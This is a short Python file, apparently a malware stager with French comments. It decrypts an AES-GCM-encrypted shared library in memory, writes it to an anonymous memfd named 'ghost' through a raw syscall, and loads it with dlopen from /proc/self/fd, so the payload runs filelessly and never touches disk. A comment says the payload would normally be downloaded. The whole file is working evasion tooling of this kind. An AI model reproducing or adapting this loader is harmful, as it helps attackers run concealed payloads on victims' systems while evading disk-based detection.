# stager.py
import ctypes
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Configuration
LIBC = ctypes.CDLL("libc.so.6")
LIBDL = ctypes.CDLL("libdl.so.2") # Parfois intégré à libc sur les systèmes récents

# Constantes noyau (x86_64)
MFD_CLOEXEC = 0x0001
SYS_memfd_create = 319
RTLD_NOW = 0x00002
RTLD_GLOBAL = 0x00100

def run_fileless(decrypted_data):
    # 1. Création du memfd via syscall direct
    # name="ghost", flags=MFD_CLOEXEC
    fd = LIBC.syscall(SYS_memfd_create, b"ghost", MFD_CLOEXEC)
    if fd < 0:
        return False

    # 2. Écriture des octets en mémoire
    LIBC.write(fd, decrypted_data, len(decrypted_data))

    # 3. Chargement via /proc/self/fd/
    path = f"/proc/self/fd/{fd}".encode()
    
    # Signature: void *dlopen(const char *filename, int flag);
    LIBDL.dlopen.restype = ctypes.c_void_p
    handle = LIBDL.dlopen(path, RTLD_NOW | RTLD_GLOBAL)
    
    if not handle:
        error = ctypes.c_char_p(LIBDL.dlerror()).value
        print(f"[-] dlopen error: {error}")
        return False

    # 4. Fermeture du FD (la lib reste mappée)
    LIBC.close(fd)
    return True

def stage(encrypted_payload_bytes, hex_key):
    key = bytes.fromhex(hex_key)
    nonce = encrypted_payload_bytes[:12]
    ciphertext = encrypted_payload_bytes[12:]
    
    # Déchiffrement en RAM
    aesgcm = AESGCM(key)
    try:
        decrypted_data = aesgcm.decrypt(nonce, ciphertext, None)
        print("[+] Déchiffrement réussi.")
        if run_fileless(decrypted_data):
            print("[+] Payload exécuté depuis la mémoire.")
    except Exception as e:
        print(f"[-] Échec : {e}")

# Exemple d'usage (le payload serait normalement récupéré via requests)
if __name__ == "__main__":
    # Simuler la récupération du payload et de la clé
    with open("payload.so.enc", "rb") as f:
        p = f.read()
    k = "VOTRE_CLE_HEX_ICI"
    stage(p, k)